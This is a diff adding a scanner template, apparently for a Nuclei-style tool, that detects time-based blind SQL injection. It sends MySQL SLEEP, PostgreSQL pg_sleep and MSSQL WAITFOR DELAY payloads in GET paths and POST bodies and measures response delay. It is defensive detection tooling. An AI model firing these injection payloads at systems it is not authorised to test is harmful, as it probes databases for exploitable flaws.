@@ -1,0 +1,109 @@
+id: timing-attack-detection
+name: "Blind SQL Injection (Time-Based)"
+author:
+  name: "CERT-X-GEN Security Team"
+  email: "security@cert-x-gen.io"
+severity: high
+description: |
+  Detects blind SQL injection vulnerabilities using time-based techniques.
+  Injects sleep/delay functions and measures response time differences.
+
+tags:
+  - sql-injection
+  - blind-sqli
+  - timing-attack
+  - database
+  - time-based
+  - web
+
+language: yaml
+confidence: 80
+
+cwe:
+  - CWE-89
+
+references:
+  - https://cwe.mitre.org/data/definitions/89.html
+  - https://owasp.org/www-community/attacks/Blind_SQL_Injection
+  - https://portswigger.net/web-security/sql-injection/blind
+
+# HTTP request specifications
+http:
+  # MySQL SLEEP injection
+  - method: GET
+    path:
+      - "/?id=1' AND SLEEP(5)--"
+      - "/?id=1') AND SLEEP(5)--"
+      - "/?id=1 AND SLEEP(5)--"
+    
+    headers:
+      User-Agent: "cert-x-gen/1.0"
+    
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+      
+      - type: status
+        status:
+          - 200
+          - 500
+
+  # PostgreSQL pg_sleep injection  
+  - method: GET
+    path:
+      - "/?id=1' AND pg_sleep(5)--"
+      - "/?id=1'; SELECT pg_sleep(5)--"
+    
+    headers:
+      User-Agent: "cert-x-gen/1.0"
+    
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+      
+      - type: status
+        status:
+          - 200
+          - 500
+
+  # MSSQL WAITFOR injection
+  - method: GET
+    path:
+      - "/?id=1'; WAITFOR DELAY '0:0:5'--"
+      - "/?id=1' WAITFOR DELAY '0:0:5'--"
+    
+    headers:
+      User-Agent: "cert-x-gen/1.0"
+    
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+      
+      - type: status
+        status:
+          - 200
+          - 500
+
+  # POST-based blind SQLi
+  - method: POST
+    path:
+      - "/search"
+      - "/login"
+      - "/api/query"
+    
+    body: "query=test' AND SLEEP(5)--&submit=1"
+    
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+      User-Agent: "cert-x-gen/1.0"
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
